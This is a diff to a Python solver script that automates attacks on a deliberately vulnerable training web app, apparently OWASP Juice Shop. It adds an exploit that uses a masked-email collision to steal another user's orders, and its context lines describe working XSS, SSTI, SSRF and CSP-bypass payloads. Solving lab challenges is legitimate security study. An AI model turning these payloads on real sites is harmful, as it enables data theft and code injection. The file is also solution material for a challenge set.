@@ -759,6 +759,44 @@ def _client_xss_protection(c):
         pass
 
 
+def _gdpr_data_theft(c):
+    """GDPR Data Theft (dataExportChallenge): orders are fetched by the VOWEL-MASKED email
+    (email.replace(/[aeiou]/gi,'*')) but the solve compares the orderId prefix against hash(REAL email).
+    Two real emails that mask identically but hash differently => one user's export leaks + steals the
+    other's orders. Place an order as A, then export as a fresh B whose mask collides with A (only the
+    leading vowel differs -> same mask, different hash). The export image-captcha leaks its own answer."""
+    import random
+    cons = "".join(random.choice("bcdfghjklmnpqrstvwxz") for _ in range(7))
+    ea, eb = "a%s@bob.com" % cons, "e%s@bob.com" % cons     # both mask to *%s@b*b.c*m ; different hash
+
+    def _reg_login(email):
+        _register(c, email, "aaaaaa")
+        j = _login(c, email, "aaaaaa")
+        return j.get("token"), j.get("bid")
+
+    try:
+        tok_a, bid_a = _reg_login(ea)
+        if not tok_a or not bid_a:
+            return
+        ha = {"Authorization": "Bearer %s" % tok_a}
+        c.post("/api/BasketItems", headers=ha, json={"ProductId": 1, "BasketId": bid_a, "quantity": 1})
+        aid = c.post("/api/Addresss", headers=ha, json={"fullName": "A", "mobileNum": "1234567890",
+                     "zipCode": "12345", "streetAddress": "1 St", "city": "X", "state": "Y",
+                     "country": "Z"}).json()["data"]["id"]
+        cid = c.post("/api/Cards", headers=ha, json={"fullName": "A", "cardNum": "4111111111111111",
+                     "expMonth": "1", "expYear": "2099"}).json()["data"]["id"]
+        did = c.get("/api/Deliverys", headers=ha).json()["data"][0]["id"]
+        c.post("/rest/basket/%s/checkout" % bid_a, headers=ha,
+               json={"couponData": None, "orderDetails": {"paymentId": str(cid), "addressId": str(aid),
+                                                          "deliveryMethodId": str(did)}})
+        tok_b, _ = _reg_login(eb)
+        hb = {"Authorization": "Bearer %s" % tok_b}
+        ans = c.get("/rest/image-captcha", headers=hb).json().get("answer")     # captcha leaks its own answer
+        c.post("/rest/user/data-export", headers=hb, json={"answer": ans, "confirmation": ""})
+    except Exception:
+        pass
+
+
 def _profile_ssrf(c):
     """SSRF: profileImageUrlUpload fetches the attacker-supplied image URL server-side. Point it at the
     app's own /solve/challenges/server-side endpoint -- the URL regex sets abused_ssrf_bug and the
@@ -800,7 +838,7 @@ def solve(base_url: str) -> dict:
                      _product_tampering, _password_hash_leak, _expired_coupon,
                      _ftp_harvest, _sqli_union_extract, _view_basket, _unsigned_jwt, _local_file_read,
                      _arbitrary_file_write, _ghost_login, _video_xss,
-                     _profile_ssti, _csp_bypass, _client_xss_protection, _profile_ssrf):
+                     _profile_ssti, _csp_bypass, _client_xss_protection, _profile_ssrf, _gdpr_data_theft):
             try:
                 step(c)
             except Exception:
@@ -842,6 +880,7 @@ SOLVE_MANIFEST = {
     "Client-side XSS Protection": "Persisted XSS -- register a user whose email is an <iframe javascript:> payload",
     "SSRF": "profileImage URL points the server-side fetch at its own /solve/challenges/server-side",
     "Mass Dispel": "Socket emit verifyCloseNotificationsChallenge with an array of length > 1",
+    "GDPR Data Theft": "Vowel-mask collision -- export as a user whose masked email matches another's orders",
     # Cryptographic Issues
     "Weird Crypto": "Name an insecure cipher (z85/MD5) in feedback",
     "Nested Easter Egg": "Decode the nested route and visit it",
@@ -957,6 +996,7 @@ SOLVE_DETAIL = {
     "SSTi": "The /profile page runs `eval()` on any username matching `#{...}`. Cookie-auth POST /profile (urlencoded) sets your username to `#{7*7}`, GET /profile evaluates it server-side and flips `abused_ssti_bug`, then GET /solve/challenges/server-side?key=... confirms it. The auth is the cookie token, NOT the Bearer header -- that mismatch is why naive attempts bound username=None.",
     "SSRF": "POST /profile/image/url with an imageUrl pointing at the app's OWN `http://localhost:3000/solve/challenges/server-side?key=...`. The server fetches that URL (the SSRF), the URL regex sets `abused_ssrf_bug`, and the server-side fetch with the key confirms the challenge.",
     "Mass Dispel": "Open a Socket.IO handshake and emit `verifyCloseNotificationsChallenge` with an array of length > 1 (e.g. [1,2]). The server solves when it receives a close-notifications event carrying more than one notification id.",
+    "GDPR Data Theft": "The data export fetches orders by the VOWEL-MASKED email (email.replace(/[aeiou]/gi,'*')) but checks the orderId prefix against hash(REAL email). Place an order as user A, then export as a fresh user B whose email masks identically to A's (only a leading vowel differs -> same mask, different hash) -- B's export leaks and steals A's orders. The export's image-captcha conveniently returns its own answer.",
     "CSP Bypass": "Two steps on your own profile: POST /profile/image/url a URL that fails to fetch and contains `;script-src 'unsafe-inline'` (stored raw into the CSP), then set the username to a `<script>alert(`xss`)</script>` payload. The username setter runs the legacy sanitizer (strips `<tag>`), so the payload is delivered as `#{String.fromCharCode(...)}` -- no literal `<` to strip -- which the profile page evals to the script at render time.",
     "Client-side XSS Protection": "The User model's email setter solves the challenge when the email contains `<iframe src=\"javascript:alert(`xss`)\">`. Register a new user (POST /api/Users) with exactly that email -- persisted XSS that the client-side sanitizer was supposed to catch.",
     # Cryptographic Issues
@@ -1069,8 +1109,8 @@ _REMAINING_BUCKET = {
     "System Prompt Extraction": "not_hosted", "AI Debugging": "not_hosted",
     "NFT Takeover": "not_hosted", "Mint the Honey Pot": "not_hosted",
     "Wallet Depletion": "not_hosted", "Mass Dispel": "not_hosted",
-    # Open frontier -- genuinely unsolved, still reachable
-    "GDPR Data Theft": "frontier",
+    # Open frontier -- CLEARED: every reachable challenge is now solved (100% of reachable). The
+    # remaining unsolved are all off-limits below (DoS / chatbot-needs-LLM / web3-needs-chain).
 }
 
 SIGNATURE = [
